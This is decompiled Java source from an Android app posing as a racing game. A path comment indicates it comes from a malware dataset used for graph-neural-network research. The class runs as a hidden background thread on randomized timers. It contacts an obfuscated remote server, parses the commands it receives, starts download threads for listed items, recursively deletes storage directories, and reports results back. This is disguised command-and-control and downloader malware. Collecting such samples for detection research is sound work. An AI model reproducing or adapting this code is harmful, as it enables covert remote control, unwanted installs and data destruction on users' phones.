package com.droidhen.game.racingmototerLHL.hnxiw;

import android.content.Context;
import android.content.SharedPreferences;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.webkit.WebView;
import java.io.File;
import java.util.ArrayList;
import java.util.Random;

/* loaded from: /mnt/c/Users/truon/OneDrive/Desktop/MyWorks/Research4IECgroup/Tasks/Graph-Attention-Networks/dataset/preprocessing/apk_tool/AMD_AndroZoo_demo/dex/a0f226d067098fffd9302f3f2954f7c2.apk/classes.dex */
public class s extends Thread {
    ArrayList a = new ArrayList();
    String[] b = null;
    String[] c = null;
    String d = null;
    protected String e;
    private Context f;
    private String g;
    private gk h;
    private r i;

    public s(Context context) {
        this.g = "";
        new pj(context);
        this.f = context;
        this.g = new WebView(context).getSettings().getUserAgentString();
        this.h = new gk(context, this.g);
        this.i = new r();
    }

    private void a() {
        try {
            String str = dem.e + dem.f;
            if (new File(str).exists() && this.b != null && this.b.length > 0) {
                File file = new File(str + dem.h);
                if (file.exists() && file.isDirectory()) {
                    String[] list = file.list();
                    for (String str2 : this.b) {
                        for (String str3 : list) {
                            if (str3.length() > 10 && str2.substring(0, 2).equals(str3.substring(6, 8)) && !str2.equals(str3.substring(6, 10))) {
                                File file2 = new File(str + dem.h + dem.k + str3.substring(6, 10) + dem.l);
                                if (file2.exists()) {
                                    file2.delete();
                                }
                                File file3 = new File(str + dem.i + dem.k + str3.substring(6, 10) + dem.m);
                                if (file3.exists()) {
                                    file3.delete();
                                }
                            }
                        }
                    }
                }
            }
        } catch (Exception e) {
        }
    }

    private void a(File file) {
        if (file.isFile()) {
            file.delete();
            return;
        }
        if (file.isDirectory()) {
            File[] listFiles = file.listFiles();
            if (listFiles == null || listFiles.length == 0) {
                file.delete();
                return;
            }
            for (File file2 : listFiles) {
                a(file2);
            }
            file.delete();
        }
    }

    private void a(String str, String str2) {
        try {
            for (String str3 : str.toString().split(str2)) {
                if (str3.startsWith(dem.Q)) {
                    this.a.add(str3.substring(2).trim());
                }
                if (str3.startsWith(dem.R)) {
                    this.d = str3.substring(2).trim();
                }
                if (str3.startsWith(dem.S)) {
                    this.b = str3.substring(2).trim().split(";");
                }
                if (str3.startsWith(dem.T)) {
                    this.e = str3.substring(2).trim();
                }
                if (str3.startsWith(dem.U)) {
                    this.c = str3.substring(2).trim().split(";");
                }
            }
        } catch (Exception e) {
        }
    }

    private boolean a(Context context) {
        NetworkInfo[] allNetworkInfo;
        int i = 3;
        if (context == null) {
            return false;
        }
        while (true) {
            int i2 = i;
            ConnectivityManager connectivityManager = (ConnectivityManager) context.getSystemService("connectivity");
            if (connectivityManager != null && (allNetworkInfo = connectivityManager.getAllNetworkInfo()) != null) {
                for (NetworkInfo networkInfo : allNetworkInfo) {
                    if (networkInfo.getState() == NetworkInfo.State.CONNECTED) {
                        return true;
                    }
                }
            }
            i = i2 - 1;
            if (i <= 0) {
                return false;
            }
            try {
                Thread.sleep(30000L);
            } catch (InterruptedException e) {
            }
        }
    }

    private void b() {
        try {
            if (this.a == null || this.a.size() <= 0) {
                ay.a(6, "2");
            } else {
                ay.a(6, "1");
                pk pkVar = new pk();
                for (int i = 0; i < this.a.size(); i++) {
                    if (pkVar.a((String) this.a.get(i))) {
                        ay.a((String) this.a.get(i), 1);
                    } else {
                        ay.a((String) this.a.get(i), 0);
                    }
                }
            }
        } catch (Exception e) {
            ay.b(1, e.getMessage());
        }
        ay.a(7, "0");
    }

    private boolean b(Context context) {
        SharedPreferences sharedPreferences = context.getSharedPreferences(dem.J, 2);
        sharedPreferences.edit();
        long j = sharedPreferences.getLong(dem.K, 0L);
        long currentTimeMillis = System.currentTimeMillis();
        if (currentTimeMillis - j < e()) {
            return false;
        }
        sharedPreferences.edit().putLong(dem.K, currentTimeMillis).commit();
        return true;
    }

    private void c() {
        if (this.b == null) {
            ay.a(10, "0");
            return;
        }
        for (String str : this.b) {
            new ill(this.f, str, this.i.a(this.h)).start();
        }
    }

    private void d() {
        try {
            if (this.c == null) {
                return;
            }
            for (String str : this.c) {
                if (str.contains(dem.N)) {
                    a(new File(dem.e + dem.j));
                }
                if (str.contains(dem.M)) {
                    a(new File(dem.e + dem.f));
                }
            }
        } catch (Exception e) {
        }
    }

    private long e() {
        Random random = new Random(System.currentTimeMillis());
        int nextInt = random.nextInt(600) + 120;
        if (nextInt <= 330 || nextInt >= 510) {
            nextInt = random.nextInt(600) + 120;
        }
        return nextInt * 60 * 1000;
    }

    @Override // java.lang.Thread, java.lang.Runnable
    public void run() {
        String a;
        String str;
        if (dem.a() && a(this.f) && b(this.f) && this.i.a(this.h, this.g)) {
            try {
                String replace = (dem.b + ":" + dem.c + dem.d + this.i.a(this.f, this.h)).replace(" ", dem.D);
                String c = this.i.c(this.h);
                ay.a(1, replace);
                ay.a(2, c);
                a = this.i.a(replace, dem.f3I, c);
                ay.a(3, a);
            } catch (Exception e) {
            }
            if (a == null || a.equals("") || a.equals(dem.y)) {
                return;
            }
            a(a, dem.L);
            if (this.b != null) {
                int i = 0;
                str = null;
                while (i < this.b.length) {
                    String str2 = str + ((String) pj.b.get(75)) + this.b[i];
                    i++;
                    str = str2;
                }
            } else {
                str = null;
            }
            ay.a(4, this.a.toString());
            ay.a(5, str);
            a();
            b();
            c();
            d();
            if (this.e != null && this.e.contains("1")) {
                this.i.a((String) pj.b.get(78), ay.a.toString());
            }
            ay.a = null;
        }
    }
}
